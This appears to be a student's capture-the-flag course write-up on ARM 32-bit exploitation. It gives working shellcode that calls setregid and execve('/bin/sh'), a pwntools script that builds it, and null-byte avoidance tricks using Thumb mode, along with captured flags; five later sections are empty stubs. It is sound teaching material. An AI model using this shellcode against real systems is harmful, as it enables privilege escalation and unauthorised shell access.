# Write-up for Unit2-2

- netID: TXK220008
- Name: Takemaru Kadoi

All the write-ups are supposed to use this import.

```python
#!/usr/bin/env python3
from pwn import *
```

- [Write-up for Unit2-2](#write-up-for-unit2-2)
  - [1-shellcode-arm](#1-shellcode-arm)
  - [2-nonzero-shellcode-arm](#2-nonzero-shellcode-arm)
  - [3-ascii-shellcode-arm](#3-ascii-shellcode-arm)
  - [4-short-shellcode-arm](#4-short-shellcode-arm)
  - [5-stack-ovfl-arm](#5-stack-ovfl-arm)
  - [6-stack-ovfl-use-envp-arm](#6-stack-ovfl-use-envp-arm)
  - [7-stack-ovfl-no-envp-arm](#7-stack-ovfl-no-envp-arm)

## 1-shellcode-arm

The problem statement is below.

````md
Write a ARM shellcode that runs:

```c
setregid(getegid(), getegid())
execve("/bin/sh", 0, 0);
```

and put the shellcode binary (`shellcode.bin`) into this directory.
````

The given binary is arm 32bit.

```bash
TXK220008@ctf-vm3:~/unit2/1-shellcode-arm $ checksec 1/1-shellcode-arm
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[*] '/home/TXK220008/unit2/1-shellcode-arm/1-shellcode-arm'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

This problem just requires you to translate what you solved in Unit2-1's level1.

The whole code will be like this.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, process

context.arch = 'arm'
# setregid(getegid(), getegid())
# getegid: 50(%r7)
# setregid: 71(%r7) (%r0 = gid_t rgid, %r1 = gid_t rgid)
shellcode = asm(
    """
mov     r7, 50
swi     0
mov     r1, r0
mov     r7, 71
swi     0
"""
)
# execve("/bin/sh", 0, 0)
# execve: 11(%r7) (%r0 = const char *filename, %r1 = const char *argv[], %r2 = const char *envp[])
shellcode += asm(
    """
adr     r0, _bin_sh
mov     r1, 0
mov     r2, 0
mov     r7, 11
swi     0
_bin_sh:
    .asciz "/bin/sh"
"""
)

with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)

```

Then, you get the flag.

```bash
TXK220008@ctf-vm3:~/unit2/1-shellcode-arm $ ./solve1.py; ./1-shellcode-arm
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
Reading shellcode from shellcode.bin
$ cat flag
CS6332{welcome_to_arm}
```

## 2-nonzero-shellcode-arm

The problem statement is below.

````md
Write a 32-bit shellcode that runs:

```c
setregid(getegid(), getegid())
execve("/bin/sh", 0, 0);
```

and put the shellcode binary (shellcode.bin) into this directory.

Your shellcode must not have zero byte.
Check that with make objdump and make print. No 00 or \x00!
````

This problem requires you to run the exactly same semantic code as the previous question.

1. To remove `0` from `swi 0`, use `swi 1010101` or `svc 1010101`.
   - The immediate value with `swi` or `svc` have nothing to do with its execution, so you can use`1010101` to remove `0x00` in binary.
2. To remove `0` to set `r0`'s value in `r1`, you can use the stack

   - Set `getegid`'s return value in `r1`

   ```armasm
   push    {r0, r1, r2, r3, r4, r5, r6, r7, r8}
   pop     {r1}
   ```

3. To remove in the second block, you can use the thumb mod.

   - This is how to enter the thumb mode.

   ```armasm
   .code 32
   add     r2, pc, #1
   bx      r2
   .code 16
   adr     r0, binsh
   sub     r1, r1
   mov     r2, r1
   strb    r2, [r0, #7]
   mov     r7, 11
   svc     1
   binsh:
     .ascii "/bin/shX"
   ```

You've got the flag!

```bash
TXK220008@ctf-vm3:~/unit2/2-nonzero-shellcode-arm $ ./solve2.py ; ./2-nonzero-shellcode-arm
Reading shellcode from shellcode.bin
$ cat flag
CS6332{denUll1phi}
```

## 3-ascii-shellcode-arm

The problem statement is below.

```md

```

## 4-short-shellcode-arm

The problem statement is below.

```md

```

## 5-stack-ovfl-arm

The problem statement is below.

```md

```

## 6-stack-ovfl-use-envp-arm

The problem statement is below.

```md

```

## 7-stack-ovfl-no-envp-arm

The problem statement is below.

```md

```
